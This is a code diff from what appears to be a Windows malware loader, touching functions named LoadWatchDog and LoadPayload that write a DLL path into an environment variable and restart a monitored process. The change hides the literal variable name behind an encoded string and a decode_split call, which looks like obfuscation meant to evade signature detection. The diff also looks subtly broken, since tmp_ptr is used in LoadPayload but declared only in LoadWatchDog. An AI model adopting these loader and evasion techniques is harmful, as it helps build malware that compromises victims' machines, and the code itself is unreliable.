@@ -606,12 +606,17 @@ void LoadWatchDog() {
 		}
 		CloseHandle(hFile);
 	} 
+
+	//TMP
+	char *tmp_ptr = decode_split("\x5\x4\x4\xd\x5\x0",6);
 		
 	//Create an env variable with the name of the dll
-	if (! SetEnvironmentVariable("TMP", module_name )) {
+	if (! SetEnvironmentVariable(tmp_ptr, module_name )) {
 #ifdef _DBG
 		Log("SetEnvironmentVariable failed (%d)\n", GetLastError());
 #endif
+		//Free memory
+		free(tmp_ptr);
         return;
     }
 
@@ -624,9 +629,11 @@ void LoadWatchDog() {
 
 	}
 	
+	//Free memory
 	if(imgBuffer)
-		free(imgBuffer);
-	
+		free(imgBuffer);		
+	if(tmp_ptr)
+		free(tmp_ptr);
 }
 
 void LoadPayload(){
@@ -677,7 +684,7 @@ void LoadPayload(){
 		free(tmp_env);
 
 		//Create an env variable with the name of the dll
-		if (! SetEnvironmentVariable("TMP", dll_path_pid.c_str() )) {
+		if (! SetEnvironmentVariable(tmp_ptr, dll_path_pid.c_str() )) {
 #ifdef _DBG
 			Log("SetEnvironmentVariable failed (%d)\n", GetLastError());
 #endif
@@ -752,7 +759,7 @@ void LoadPayload(){
 		Log("Restarting monitored process.");
 #endif
 		//Set it back
-		if (! SetEnvironmentVariable("TMP", dll_path_pid.c_str() )) {
+		if (! SetEnvironmentVariable(tmp_ptr, dll_path_pid.c_str() )) {
 	#ifdef _DBG
 			Log("SetEnvironmentVariable failed (%d)\n", GetLastError());
 	#endif
